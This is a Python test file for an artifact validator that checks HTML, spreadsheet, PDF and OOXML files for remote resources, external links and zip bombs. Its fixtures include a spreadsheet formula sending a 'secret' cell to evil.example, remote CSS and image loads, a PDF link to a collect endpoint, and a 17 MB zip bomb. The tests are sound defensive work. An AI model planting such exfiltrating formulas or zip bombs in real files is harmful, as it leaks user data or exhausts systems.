import zipfile
from pathlib import Path

import pymupdf
import pytest
from openpyxl import Workbook
from pydantic import ValidationError

from app.cowork.artifact_lock import artifact_commit_lock
from app.cowork.artifact_renderers.contracts import DocumentBlock, HtmlReportSpec
from app.cowork.artifact_validation import (
    _external_ooxml_relationships,
    validate_artifact,
    validate_artifact_in_subprocess,
)
from app.cowork.files import CoworkFileError


def test_artifact_commit_lock_is_exclusive_for_the_whole_target(tmp_path: Path) -> None:
    target = tmp_path / "report.html"

    with artifact_commit_lock(target):
        with pytest.raises(CoworkFileError, match="另一个 Artifact 提交"):
            with artifact_commit_lock(target):
                raise AssertionError("不可达")


@pytest.mark.parametrize(
    "payload",
    [
        "<style>@import url(//evil.example/theme.css)</style>",
        "<div style=\"background:url(https://evil.example/pixel)\">x</div>",
        "<img srcset=\"//evil.example/a.png 1x, /local.png 2x\">",
        "<img src=https://evil.example/unquoted.png>",
    ],
)
def test_offline_html_rejects_remote_html_and_css_resources(
    tmp_path: Path,
    payload: str,
) -> None:
    target = tmp_path / "report.html"
    target.write_text(f"<!doctype html><title>安全检查</title>{payload}", encoding="utf-8")

    report = validate_artifact(target)

    assert report.security.status == "failed"
    assert report.deliverable is False


def test_ooxml_external_relationships_are_parsed_as_xml(tmp_path: Path) -> None:
    target = tmp_path / "relationships.zip"
    with zipfile.ZipFile(target, "w") as archive:
        archive.writestr(
            "_rels/.rels",
            """<?xml version="1.0"?>
            <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
              <Relationship Id="rId1" Type="template" Target="https://evil.example/x"
                TargetMode = "External" />
            </Relationships>""",
        )

    assert _external_ooxml_relationships(target) == ["_rels/.rels"]


def test_ooxml_zip_bomb_is_rejected_before_office_parser(tmp_path: Path) -> None:
    target = tmp_path / "bomb.xlsx"
    with zipfile.ZipFile(target, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", "<Types />")
        archive.writestr("xl/bomb.xml", b"A" * (17 * 1024 * 1024))

    with pytest.raises(ValueError, match="zip bomb"):
        validate_artifact(target)


def test_xlsx_rejects_network_formula(tmp_path: Path) -> None:
    target = tmp_path / "network.xlsx"
    workbook = Workbook()
    workbook.active["A1"] = "secret"
    workbook.active["A2"] = '=WEBSERVICE("https://evil.example/?x="&A1)'
    workbook.save(target)

    report = validate_artifact(target)

    assert report.security.status == "failed"
    assert any(check.name == "network_formula" for check in report.security.checks)


def test_pdf_rejects_uri_actions(tmp_path: Path) -> None:
    target = tmp_path / "active.pdf"
    document = pymupdf.open()
    page = document.new_page()
    page.insert_text((72, 72), "Open link")
    page.insert_link(
        {
            "kind": pymupdf.LINK_URI,
            "from": pymupdf.Rect(70, 55, 150, 80),
            "uri": "https://evil.example/collect",
        }
    )
    document.save(target)
    document.close()

    report = validate_artifact(target)

    assert report.security.status == "failed"
    assert report.deliverable is False


def test_pdf_vector_drawing_is_not_classified_as_blank(tmp_path: Path) -> None:
    target = tmp_path / "vector.pdf"
    document = pymupdf.open()
    page = document.new_page()
    page.draw_rect(pymupdf.Rect(72, 72, 300, 300), color=(0, 0, 0), fill=(0.2, 0.8, 0.4))
    document.save(target)
    document.close()

    report = validate_artifact(target)

    blank_check = next(check for check in report.visual.checks if check.name == "blank_pages")
    assert blank_check.status == "passed"


def test_untrusted_artifact_validation_runs_in_limited_subprocess(tmp_path: Path) -> None:
    target = tmp_path / "active.html"
    target.write_text("<!doctype html><title>x</title><script>alert(1)</script>", encoding="utf-8")

    report = validate_artifact_in_subprocess(target, max_file_bytes=1024 * 1024)

    assert report.security.status == "failed"


def test_artifact_claim_ids_must_be_unique() -> None:
    with pytest.raises(ValidationError, match="claim_id 必须唯一"):
        HtmlReportSpec.model_validate(
            {
                "title": "重复 claim",
                "claims": [
                    {
                        "claim_id": "same",
                        "text": "第一条",
                        "target_type": "html_section",
                        "target_id": "s1",
                    },
                    {
                        "claim_id": "same",
                        "text": "第二条",
                        "target_type": "html_section",
                        "target_id": "s1",
                    },
                ],
                "sections": [{"id": "s1", "heading": "内容", "blocks": []}],
            }
        )


@pytest.mark.parametrize(
    "payload",
    [
        {"type": "paragraph", "items": ["不会渲染"]},
        {"type": "paragraph"},
        {"type": "bullets", "text": "不会渲染", "items": ["项目"]},
        {"type": "bullets"},
        {"type": "quote", "headers": ["不会渲染"]},
        {"type": "table", "headers": ["列"], "text": "不会渲染"},
    ],
)
def test_document_block_rejects_missing_or_unconsumed_fields(
    payload: dict[str, object],
) -> None:
    with pytest.raises(ValidationError):
        DocumentBlock.model_validate(payload)
